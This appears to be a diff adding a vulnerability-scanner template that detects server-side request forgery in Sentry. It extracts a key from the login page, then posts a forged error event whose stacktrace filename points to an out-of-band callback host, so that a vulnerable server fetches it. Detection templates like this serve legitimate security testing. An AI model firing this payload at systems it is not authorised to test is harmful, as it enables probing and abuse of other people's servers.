@@ -1,0 +1,64 @@
+id: sentry-ssrf
+
+info:
+  name: Sentry SSRF Detection
+  author: yourname
+  severity: high
+  tags: ssrf, sentry
+
+http:
+  - raw:
+      - |
+        GET /auth/login/ HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: sentrysid="gAJ9cQFVBV9uZXh0cQJYAQAAAC9zLg:1w60Ez:Xu0XT_DIGiirN1H5BeRrJwGv3xY"
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Sec-Fetch-Site: none
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-User: ?1
+        Sec-Fetch-Dest: document
+        Sec-Ch-Ua: "Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"
+        Sec-Ch-Ua-Mobile: ?0
+        Sec-Ch-Ua-Platform: "Windows"
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+        Connection: keep-alive
+
+      - |
+        POST /api/1/store/?sentry_version=7&sentry_client=raven-js%2f3.15.0&sentry_key={{sentry_key}} HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+        Accept-Language: zh-CN,zh;q=0.9
+        Content-type: application/json
+        Origin: https://{{Hostname}}
+        Content-Length: {{body_length}}
+
+        {"project":"30","logger":"javascript","platform":"javascript","exception":{"values":[{"type":"Error","value":"Trying to get control scope but angular isn't ready yet or something like this","stacktrace":{"frames":[{"filename":"http://{{interactsh-url}}/","lineno":110,"colno":81071,"function":"xmlHttpRequest.o","in_app":true}]}}]}}
+
+    extractors:
+      - type: regex
+        name: sentry_key
+        part: body
+        regex:
+          - '([a-f0-9]{32})'
+        internal: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body_1
+        words:
+          - '"dsn":"https://'
+        condition: and
+
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
+        condition: or
